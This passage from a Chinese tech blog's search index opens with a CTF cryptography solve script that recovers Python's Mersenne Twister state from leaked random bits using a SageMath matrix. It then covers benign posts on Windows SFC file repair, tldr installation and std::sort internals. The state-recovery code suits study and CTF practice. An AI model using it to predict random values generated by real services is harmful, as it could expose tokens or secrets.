punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>        state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span>originState<span class="token punctuation">)</span>    prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    originState <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> prng<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>originState<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> state<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#     print(state)</span>    <span class="token keyword">return</span> state<span class="token punctuation">,</span>btest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token comment"># 根据文件中的信息，构造矩阵</span><span class="token keyword">def</span> <span class="token function">buildMatrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">19968</span>    cnt <span class="token operator">=</span> <span class="token number">0</span>    m <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"Matrix"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        row <span class="token operator">=</span> cnt <span class="token operator">//</span> <span class="token number">19968</span>        col <span class="token operator">=</span> cnt <span class="token operator">%</span> <span class="token number">19968</span>        m<span class="token punctuation">[</span>row<span class="token punctuation">,</span> col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cnt <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> mm <span class="token operator">=</span> buildMatrix<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># X = Z*(T^-1)</span><span class="token keyword">def</span> <span class="token function">recoverState</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> m<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span><span class="token punctuation">)</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">return</span> state<span class="token comment"># 根据题型2,还原state,有两种可能,这时候可以用暴破</span><span class="token keyword">def</span> <span class="token function">backfirst</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">0x80000000</span>    low <span class="token operator">=</span> <span class="token number">0x7fffffff</span>    mask <span class="token operator">=</span> <span class="token number">0x9908b0df</span>    tmp <span class="token operator">=</span> state<span class="token punctuation">[</span><span class="token number">623</span><span class="token punctuation">]</span> <span class="token operator">^</span> state<span class="token punctuation">[</span><span class="token number">396</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token operator">==</span> high<span class="token punctuation">:</span>        tmp <span class="token operator">^</span><span class="token operator">=</span> mask        tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>        tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> tmp <span class="token operator">&amp;</span> low<span class="token punctuation">,</span> tmp <span class="token operator">&amp;</span> low<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">:</span>    state <span class="token operator">=</span> recoverState<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>    L <span class="token operator">=</span> <span class="token punctuation">[</span>leak<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    prng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    guess1<span class="token punctuation">,</span> guess2 <span class="token operator">=</span> backfirst<span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>guess1<span class="token punctuation">,</span> guess2<span class="token punctuation">)</span>    state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> guess1    s <span class="token operator">=</span> state    prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> g1 <span class="token operator">==</span> L<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span>        prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> prng    state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> guess2    s <span class="token operator">=</span> state    prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g2 <span class="token operator">=</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> g2 <span class="token operator">==</span> L<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"second"</span><span class="token punctuation">)</span>        prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> prng<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">19968</span>    prng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    originState <span class="token operator">=</span> prng<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span>    leak <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># 恢复state</span>    state <span class="token operator">=</span> recoverState<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>    prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span>originState<span class="token punctuation">)</span>    prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    originState <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> prng<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token comment"># 成功恢复623个state</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>originState<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> state<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># 获取泄露信息</span>    L <span class="token operator">=</span> <span class="token punctuation">[</span>leak<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment"># 两种可能</span>    guess1<span class="token punctuation">,</span> guess2 <span class="token operator">=</span> backfirst<span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>guess1<span class="token punctuation">,</span> guess2<span class="token punctuation">)</span>    state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> guess1    s <span class="token operator">=</span> state    prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> g1 <span class="token operator">==</span> L<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span>        prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        now <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> now <span class="token operator">==</span> leak<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>    state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> guess2    s <span class="token operator">=</span> state    prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g2 <span class="token operator">=</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> g2 <span class="token operator">==</span> L<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"second"</span><span class="token punctuation">)</span>        prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        now <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> now <span class="token operator">==</span> leak<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概需要6-7分钟可以构建完矩阵。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Dism&#92;SFC修复系统dll</title>
      <link href="/2022/01/16/shi-yong-dism-sfc-xiu-fu-xi-tong-dll/"/>
      <url>/2022/01/16/shi-yong-dism-sfc-xiu-fu-xi-tong-dll/</url>
      
        <content type="html"><![CDATA[<h2 id="使用sfc手动修复windows-10指定文件">使用SFC手动修复Windows10指定文件</h2><p>默认情况下执行 SFC命令会自动尝试对所有有问题的文件进行修复，当一个或多个文件无法自动修复时，通常都需要用户对其进行手动修复操作。与其说手动修复，其实就是在一台正常的Windows 10 中把完好无损的文件拿过来替换掉已损坏的文件就 OK 了。</p><p>具体有哪些文件修复失败，可以在前面介绍过的 sfclogs.txt日志文件中找到，下面我们只讲具体的操作方法。</p><p>1点击 Windows + X 快捷键 – 选择「命令提示符（管理员）</p><p>2在 CDM 窗口中执行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">takeown /f C:\要修复的文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>takeown 这个命令就是更改文件「所有者」的命令，这让我想起了 N多年前讲师不断重复的 take ownership。</p><p>3在拿到文件所有权后，还需要使用如下命令获取文件的完全控制权限：</p><pre class="line-numbers language-none"><code class="language-none">icacls C:\要修复的文件路径 /Grant Administrators:F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4然后再用一个完好无损的文件去替换掉损坏的文件即可，大家可以手动替换或用命令行：</p><pre class="line-numbers language-none"><code class="language-none">copy C:\完好无损的文件 C:\要修复的文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件替换完成后，你可以执行 SFC /verifyonly来验证文件系统的完整性，查看问题是否已经得到修复。如果你只修复了个别文件，可以使用sfc /VERIFYFILE=C:来进行查看，以避免长时间的完整扫描。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Windows下的字体映射/回退（Fontlink/Fallback）</title>
      <link href="/2022/01/15/qian-tan-windwos-xia-de-zi-ti-ying-she-hui-tui-fontlink-fallback/"/>
      <url>/2022/01/15/qian-tan-windwos-xia-de-zi-ti-ying-she-hui-tui-fontlink-fallback/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 字体 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLDR-Pages: 命令说明书</title>
      <link href="/2022/01/15/tldr-pages-ming-ling-shuo-ming-shu/"/>
      <url>/2022/01/15/tldr-pages-ming-ling-shuo-ming-shu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>https://tldr.sh/</p></blockquote><h3 id="什么是tldr">什么是TLDR</h3><p>tl;dr 是一个网络词汇，和十动然拒这类差不多，是个缩写。它的全称是「TooLong; Don'tRead」，翻译成中文的话就叫「太长不看」。它兴起于一些论坛，为了说明「楼主你的破文章又臭又长」，不过后来有许多文章的开头也用</p><h3 id="tldr插件">TLDR插件</h3><p><code>tldr</code>很好地解决了<code>man</code>产生的帮助文件过于冗长的问题，把<code>man pages</code>中最常用的选项用更简单的方式叙述了出来：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="/images/tldr.svg" alt="我是矢量图哦~"><figcaption aria-hidden="true">我是矢量图哦~</figcaption></figure><h3 id="安装">安装</h3><p>TLDR有两种安装方式：</p><ul><li>通过 <code>npm</code></li></ul><pre class="line-numbers language-none"><code class="language-none">npm install -g tldr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过<code>pip3</code></li></ul><pre class="line-numbers language-none"><code class="language-none">pip3 install tldr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++ 严格弱序</title>
      <link href="/2022/01/06/c-yan-ge-ruo-xu/"/>
      <url>/2022/01/06/c-yan-ge-ruo-xu/</url>
      
        <content type="html"><![CDATA[<h3 id="stl-sort">STL <code>sort</code></h3><p>STL的<code>std::sort</code>函数是基于Musser在1996年提出的内省排序（<code>Introspective sort</code>）算法实现。这个算法是个缝合怪，它汲取了插入排序、堆排序以及快排的优点：</p><ul><li>针对大数据量，使用快排，时间复杂度是<code>O(NlogN)</code>；</li><li>若快排递归深度超过阈值<code>__depth_limit</code>，改用堆排序，防止快排递归过深，同时保持时间复杂度仍是<code>O(NlogN)</code>；</li><li>当数据规模小于阈值<code>_S_threshold</code>时，改用插入排序。</li></ul><h4 id="std__sort">std::__sort</h4><p><code>std::sort</code>函数在内部就是直接调用的<code>std::__sort</code>函数。因此下面，直接从<code>std::__sort</code>函数开始分析。</p><p><code>std::__sort</code>代码如下:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">inline</span> <span class="token keyword">void</span><span class="token function">__sort</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span> _RandomAccessIterator __last<span class="token punctuation">,</span> _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__first <span class="token operator">!=</span> __last<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">// 先是完成局部有序</span>    std<span class="token double-colon punctuation">::</span><span class="token function">__introsort_loop</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span>                          std<span class="token double-colon punctuation">::</span><span class="token function">__lg</span><span class="token punctuation">(</span>__last <span class="token operator">-</span> __first<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span>                           __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 再完全有序</span>    std<span class="token double-colon punctuation">::</span><span class="token function">__final_insertion_sort</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，<code>std::__sort</code>主体上分为两个部分：</p><ol type="1"><li>首先，由<code>__introsort_loop</code>函数使得<code>[__first, __last)</code>区间在多个局部有序；</li><li>其次，对第一步的结果，再进行一次插入排序<code>std::__final_insertion_sort</code>，保证整个<code>[__first, __last)</code>区间有序。</li></ol><p>下面从以上两点进行详述。</p><blockquote><p>为便于讲解，在下面的描述中，将比较器<code>_Compare</code>当作默认的<code>std::less</code>来处理。</p></blockquote><h4 id="std__introsort_loop">std::__introsort_loop</h4><p><code>__introsort_loop</code>函数，其代码实现如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Size</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">void</span> <span class="token function">__introsort_loop</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span> _RandomAccessIterator __last<span class="token punctuation">,</span>                      _Size __depth_limit<span class="token punctuation">,</span>                       _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 限制条件1</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>__last <span class="token operator">-</span> __first <span class="token operator">&gt;</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment">// 限制条件2</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>__depth_limit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      std<span class="token double-colon punctuation">::</span><span class="token function">__partial_sort</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 堆排序</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>         <span class="token comment">//下面是快排</span>    <span class="token operator">--</span>__depth_limit<span class="token punctuation">;</span>     _RandomAccessIterator __cut <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">__unguarded_partition_pivot</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 寻找轴点</span>    std<span class="token double-colon punctuation">::</span><span class="token function">__introsort_loop</span><span class="token punctuation">(</span>__cut<span class="token punctuation">,</span> __last<span class="token punctuation">,</span> __depth_limit<span class="token punctuation">,</span> __comp<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// 递归</span>    __last <span class="token operator">=</span> __cut<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面可以看出，<code>__introsort_loop</code>函数是个递归函数，并且存在两个限制条件，或者说是递归基：</p><ol type="1"><li><p>每次递归时，<code>[__first, __last)</code>区间的元素个数必须大于<code>_S_threshold</code>：</p><p>当不满足这个条件时，<code>__introsort_loop</code>函数就开始返回，这会导致元素个数小于阈值<code>_S_threshold</code>的小区间仍然是无序的。</p><p>那么这部分小区间怎么实现有序呢？？？</p></li><li><p>最大递归深度<code>__depth_limit</code>：</p><p>当<code>__depth_limit==0</code>时，快排递归深度达到限制，为避免递归层数过深，STL就对当前的<code>[__first, __last)</code> 区间进行堆排序。</p><p>从另一个角度看，相当于通过 <code>__depth_limit</code>限制条件，将<code>__introsort_loop</code>函数划分为快排、堆排两部分，而且不一定每次都会调用堆排，需要满足<code>__depth_limit</code>限制条件。</p></li></ol><p>因此，<code>__introsort_loop</code>函数能正常递归，需要满足以下条件：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">__last <span class="token operator">-</span> __first <span class="token operator">&gt;</span> <span class="token keyword">int</span><span class="token punctuation">(</span>_S_threshold<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> __depth_limit <span class="token operator">&gt;</span> 